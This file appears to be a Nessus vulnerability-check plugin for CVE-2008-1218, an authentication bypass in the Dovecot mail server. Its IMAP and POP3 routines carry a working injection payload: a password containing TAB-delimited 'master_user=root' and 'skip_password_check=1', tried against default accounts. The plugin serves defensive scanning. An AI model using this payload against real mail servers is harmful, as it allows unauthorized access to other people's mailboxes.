#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31466);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2008-1218");
  script_bugtraq_id(28181);
  script_xref(name:"Secunia", value:"29295");
  script_xref(name:"OSVDB", value:"42979");

  script_name(english:"Dovecot passdbs Argument Injection Authentication Bypass");
  script_summary(english:"Tries to bypass Dovecot authentication");

 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by an authentication bypass
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Dovecot, an open-source IMAP4 / POP3 server
for Linux / Unix. 

The version of Dovecot installed on the remote host uses a TAB
character as a delimiter internally but fails to escape them when they
appear in a password.  Provided Dovecot is configured to use a
blocking passdb, an attacker can leverage this issue to bypass
authentication and gain access to a user's mailbox." );
 script_set_attribute(attribute:"see_also", value:"http://www.dovecot.org/list/dovecot-news/2008-March/000064.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Dovecot v1.0.13 / v1.1.rc3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N" );
script_end_attributes();

 
  script_category(ACT_GATHER_INFO);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("find_service2.nasl");
  script_require_ports("Services/imap", 143, "Services/pop3", 110);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");
include("misc_func.inc");
include("pop3_func.inc");


# Test IMAP ports.
port = get_kb_item("Services/imap");
if (!port) port = 143;
if (get_port_state(port) && !get_kb_item("imap/false_imap"))
{
  # Unless we're paranoid, make sure the banner corresponds to Dovecot.
  #
  # nb: this corresponds to 'login_greeting' in dovecot.conf and
  #     is configurable.
  banner = get_imap_banner(port:port);
  if (
    report_paranoia > 1 ||
    (banner && "dovecot ready" >< tolower(banner))
  )
  {
    # Get a list of users to check.
    #
    # nb: for the check to work, we must have a valid user who can normally
    #     authenticate to dovecot; see the discussion about mail users, and
    #     especially UIDs, at <http://wiki.dovecot.org/UserIds>.
    if (get_kb_item("imap/login")) users = make_list(get_kb_item("imap/login"));
    else users = make_list(
      "nobody",
      "nfsnobody"
    );

    # Try to exploit the issue.
    pass = string(SCRIPT_NAME, "\tmaster_user=root\tskip_password_check=1");
    vuln = FALSE;

    foreach user (users)
    {
      # Establish a connection.
      tag = 0;
      soc = open_sock_tcp(port);
      if (soc)
      {
        s = recv_line(socket:soc, length:1024);
        if (strlen(s))
        {
          s = chomp(s);

          # - try the PLAIN SASL mechanism.
          #   nb: RFC 3501 requires this be supported by imap4rev1 servers, although
          #       it may also require SSL / TLS encapsulation.
          resp = NULL;
          ++tag;

          c = string("nessus", tag, ' AUTHENTICATE "PLAIN"');
          send(socket:soc, data:string(c, "\r\n"));
          s = recv_line(socket:soc, length:1024);
          s = chomp(s);
          if (s == "+")
          {
            c = base64(str:raw_string(0, user, 0, pass));
            send(socket:soc, data:string(c, "\r\n"));
            while (s = recv_line(socket:soc, length:1024))
            {
              s = chomp(s);
              m = eregmatch(pattern:string("^nessus", tag, " (OK|BAD|NO)"), string:s, icase:TRUE);
              if (!isnull(m))
              {
                resp = m[1];

                # There's a problem if we were successful.
                if (resp && resp =~ "^OK") vuln = TRUE;

                break;
              }
              resp = "";
            }
          }
          # - if that didn't work, try LOGIN command.
          if (!resp)
          {
            ++tag;
            c = string("nessus", tag, " LOGIN ", user, ' "', pass, '"');
            send(socket:soc, data:string(c, "\r\n"));
            while (s = recv_line(socket:soc, length:1024))
            {
              s = chomp(s);
              m = eregmatch(pattern:string("^nessus", tag, " (OK|BAD|NO)"), string:s, icase:TRUE);
              if (!isnull(m))
              {
                resp = m[1];

                # There's a problem if we were successful.
                if (resp && resp =~ "OK") vuln = TRUE;

                break;
              }
              resp = "";
            }
          }

          # Logout.
          ++tag;
          c = string("nessus", tag, " LOGOUT");
          send(socket:soc, data:string(c, "\r\n"));
          while (s = recv_line(socket:soc, length:1024))
          {
            s = chomp(s);
            m = eregmatch(pattern:string("^nessus", tag, " (OK|BAD|NO)"), string:s, icase:TRUE);
            if (!isnull(m))
            {
              resp = m[1];
              break;
            }
            resp = "";
          }
        }
        close(soc);

        if (vuln)
        {
          security_warning(port);
          if (thorough_tests) break;
          else exit(0);
        }
      }
    }
  }
}


# Test POP3 ports.
port = get_kb_item("Services/pop3");
if (!port) port = 110;
if (get_port_state(port) && !get_kb_item("pop3/false_pop3"))
{
  # Unless we're paranoid, make sure the banner corresponds to Dovecot.
  banner = get_pop3_banner(port:port);
  if (
    report_paranoia > 1 ||
    (banner && "dovecot ready" >< tolower(banner))
  )
  {
    # Get a list of users to check.
    #
    # nb: for the check to work, we must have a valid user who can normally
    #     authenticate to dovecot; see the discussion about mail users, and
    #     especially UIDs, at <http://wiki.dovecot.org/UserIds>.
    if (get_kb_item("pop3/login")) users = make_list(get_kb_item("pop3/login"));
    else users = make_list(
      "nobody",
      "nfsnobody"
    );

    # Try to exploit the issue.
    pass = string(SCRIPT_NAME, "\tmaster_user=root\tskip_password_check=1");
    vuln = FALSE;

    foreach user (users)
    {
      # Establish a connection.
      tag = 0;
      soc = open_sock_tcp(port);
      if (soc)
      {
        s = recv_line(socket:soc, length:1024);
        if (strlen(s))
        {
          s = chomp(s);

          resp = "";
          c = string("USER ", user);
          send(socket:soc, data:string(c, "\r\n"));
          while (s = recv_line(socket:soc, length:1024))
          {
            s = chomp(s);
            m = eregmatch(pattern:"^(\+OK|-ERR)( |$)", string:s, icase:TRUE);
            if (!isnull(m))
            {
              resp = m[1];
              break;
            }
            resp = "";
          }
          if (resp && resp =~ "OK") 
          {
            c = string("PASS ", pass);
            send(socket:soc, data:string(c, "\r\n"));
            while (s = recv_line(socket:soc, length:1024))
            {
              s = chomp(s);
              m = eregmatch(pattern:"^(\+OK|-ERR)( |$)", string:s, icase:TRUE);
              if (!isnull(m))
              {
                resp = m[1];

                # There's a problem if we were successful.
                if (resp && resp =~ "^\+OK") vuln = TRUE;

                break;
              }
              resp = "";
            }
          }

          # Logout.
          c = "QUIT";
          send(socket:soc, data:string(c, "\r\n"));
          while (s = recv_line(socket:soc, length:1024))
          {
            s = chomp(s);
            m = eregmatch(pattern:"^(\+OK|-ERR)( |$)", string:s, icase:TRUE);
            if (!isnull(m))
            {
              resp = m[1];
              break;
            }
            resp = "";
          }
        }
        close(soc);

        if (vuln)
        {
          security_warning(port);
          if (thorough_tests) break;
          else exit(0);
        }
      }
    }
  }
}
